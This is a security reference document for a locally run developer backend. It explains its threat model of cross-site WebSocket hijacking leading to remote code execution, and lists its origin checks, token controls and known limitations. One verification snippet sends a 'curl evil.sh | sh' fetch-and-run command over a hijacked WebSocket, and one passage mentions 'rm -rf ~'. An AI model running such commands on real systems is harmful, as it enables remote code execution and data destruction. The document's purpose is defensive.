# Security

How PiNodes Orchestra protects the local backend, what each control does (and
does not) stop, and the limits we deliberately accept. The hardening described
here was implemented in **v0.2.14**; this document is the reference for the
current security posture, not a roadmap.

## Threat model

The backend runs locally (or, opt-in, on a LAN) for a **single developer**.
Nothing here assumes multi-user or internet-exposed deployments — those are out
of scope (see [ARCHITECTURE.md](../../ARCHITECTURE.md)).

The realistic attacker is **a web page the user visits while the backend is
up** — a compromised site, a malicious ad, or a drive-by script — that opens a
`WebSocket("ws://localhost:3847/ws")` from the browser and writes into a pi
terminal that has the `bash` tool enabled. That is **RCE from a web origin the
user did not authorise**. Secondary risks (filesystem enumeration via
`/api/validate-path`, prompt/workflow tampering, fake handoffs) flow from the
same gap.

## What protects what

| Layer | What it stops | What it does NOT stop |
|-------|---------------|-----------------------|
| **Bind `127.0.0.1`** (default) | Remote machines on LAN/WiFi reaching the backend | Other local processes on the same machine (they all see `127.0.0.1`) |
| **CORS Origin allowlist** | Cross-origin browser fetches from malicious sites (`evil.com` → `/api/validate-path`, `/api/prompts`, …) | Same-origin requests; requests from extensions with `host_permissions`; `curl` / non-browser tools |
| **WebSocket Origin check** | Cross-Site WebSocket Hijacking (CSWSH) from malicious pages | Same-origin WS connections; non-browser tools that don't send `Origin` |
| **`PINODES_ORCHESTRA_TOKEN`** (opt-in) | All of the above + other local processes + browser extensions (when set) | Nothing on its own — it only adds value if the secret is NOT readable by the attacker |
| **Ephemeral token in the VS Code extension** (automatic) | Other local processes connecting to the backend port while the panel is open; malicious browser extensions | Processes that can read the extension host's memory (unlikely in practice) |

### Why a persisted default token doesn't help

A token auto-generated and written to a file (e.g. `data/auth-token`) is
readable by any process with the same user permissions. A secret that both the
legitimate client and the attacker can read from the same source is not a
secret — it adds friction against naïve scanners but not against a real local
attacker. Worse, a local process that wants to run arbitrary commands can
already do `pi -- bash "rm -rf ~"` directly — the backend is an alternative
path, not a new attack surface.

### Where an ephemeral token DOES help: the VS Code extension

The extension host is a **trusted intermediary** that can generate a secret the
webview knows but other local processes cannot easily discover:

- `BackendManager` generates `crypto.randomUUID()` at construction time
  (`resolveSessionToken()` in `vscode-extension/src/sessionToken.ts`).
- It is passed as `PINODES_ORCHESTRA_TOKEN` to the backend subprocess and as
  `?token=` in the webview iframe URL.
- Ephemeral (changes on each extension activation, never persisted to disk),
  zero user config.

This is the one case where a token has real value with zero UX cost.

## Current controls

| Surface | Auth | Bind | Origin check | Where |
|---------|------|------|--------------|-------|
| `/api/v1/orchestra/*` (REST) | ✅ global `preHandler` | `127.0.0.1` | — | `index.ts` global hook |
| `/api/prompts`, `/api/workflows`, `/api/validate-path` | ✅ global `preHandler` | `127.0.0.1` | — | same global hook |
| `/internal/*` (call-agent, ready, …) | ✅ global `preHandler` | `127.0.0.1` | — | pi-extension reads the token from PTY env |
| `/api/health` | ❌ exempt (liveness probe) | `127.0.0.1` | — | used by the extension health-check |
| `/ws` (WebSocket) | ✅ `?token=` on handshake | `127.0.0.1` | ✅ Origin allowlist | `utils/security.ts:validateWebSocketHandshake` |
| CORS | ✅ Origin allowlist | — | — | `index.ts` with `buildAllowedOrigins()` |
| VS Code extension | ✅ ephemeral auto-token | `127.0.0.1` | — | `crypto.randomUUID()` when the user hasn't configured one |

The three conditions that made the original browser→RCE attack realistic are
now closed:

1. ~~`0.0.0.0`~~ → `127.0.0.1` by default (opt-in `PINODES_ORCHESTRA_HOST=0.0.0.0`).
2. ~~`cors({ origin: true })`~~ → Origin allowlist.
3. ~~WS without auth or Origin check~~ → both in place.

A related correctness fix landed at the same time: a `load_graph` (or persisted
board) whose `cwd` no longer exists is **rejected** rather than silently
falling back to the backend's own directory. `PtyHub.setGraph` is the single
`resolveCwd` validation choke point; on restart, boards with a stale `cwd` are
skipped with a log line instead of spawning pi in the wrong place.

## Configuration

| Variable | Effect |
|----------|--------|
| `PINODES_ORCHESTRA_HOST` | Listen host. Default `127.0.0.1`. Set `0.0.0.0` only for explicit LAN/remote use. |
| `PINODES_ORCHESTRA_ALLOWED_ORIGINS` | Comma-separated extra browser origins allowed by CORS and the WS Origin check. |
| `PINODES_ORCHESTRA_TOKEN` | Optional shared secret. When set, required on every `/api/*` and `/internal/*` route (except `/api/health`) and on the WS handshake via `?token=`. |

When a token is set, browser clients pass it via `?token=…` in the URL or
`localStorage.PINODES_ORCHESTRA_TOKEN`; the VS Code extension injects it from
the `pinodesOrchestra.token` setting (or its ephemeral auto-token).

## Verifying the posture

With the backend running, the original attack no longer works:

```js
// from the DevTools of example.com
const ws = new WebSocket("ws://localhost:3847/ws");
ws.onopen = () => ws.send(JSON.stringify({
  type: "pty_input", nodeId: "<any>", data: "curl evil.sh | sh\r",
}));
```

- `Origin: http://example.com` → connection closed with code **4001**.
- Without `?token=` (when a token is set) → closed with code **4002**.
- With `PINODES_ORCHESTRA_HOST` left at default → unreachable from other machines.

Other quick checks:

- `curl -H "Origin: http://evil.com" -I http://localhost:3847/api/prompts` → no
  `Access-Control-Allow-Origin: http://evil.com` header; from `localhost:5173`
  it is present.
- `cd vscode-extension && npx vitest run` → `resolveSessionToken()` tests pass.

## What we deliberately don't do

- **No user auth / RBAC** — single-user project, out of scope.
- **No HTTPS/WSS for localhost** — local certificates would cost more than the
  risk they remove; loopback bind + Origin check are sufficient.
- **No token encryption at rest** — it is an env-based shared secret, not a user
  credential; a vault/HSM is overkill.
- **No WS rate limiting** — single-user local backend, no abuse case.

## Runtime configuration security

Each node carries an optional `runtimeConfig: Record<string, unknown>` field,
persisted in SQLite (`boards.graph_data`) and broadcast to the browser via
WebSocket. **Never store secrets in `runtimeConfig`.**

- ✅ Allowed: model name, toolset selection, feature flags, tuning parameters.
- ❌ Forbidden: API keys, tokens, passwords, or any credential.

Credentials live in the runtime's own config:
- **pi**: `~/.pi/agent/auth.json` or env vars
- **hermes**: `~/.hermes/` or `HERMES_API_KEY` env var

This constraint is enforced by convention and documentation, not by the
serializer — `runtimeConfig` is a generic JSON blob.

## Known limitations & future hardening

These are not yet implemented. They are robustness/observability improvements
rather than open security holes — the browser→RCE vector is already closed.

- **Typed WS protocol.** `ws/handler.ts` still casts fields (`msg.cols as
  number`). A discriminated union + a `parseClientMessage` guard would reject
  malformed payloads cleanly instead of producing `NaN`/undefined behaviour.
- **Deterministic graph sync.** The frontend uses a few magic `setTimeout`s
  before injecting a task; a `graph_synced` ack from the backend would remove
  the residual races on slow machines / large boards.
- **CI gate.** Only the publish-on-tag workflow (`publish-extension.yml`) exists;
  there is no test + typecheck + build gate on PRs.

> Resolved since this doc was first written: `ws/handler.ts` now has direct unit
> coverage (`backend/src/ws/handler.test.ts`).
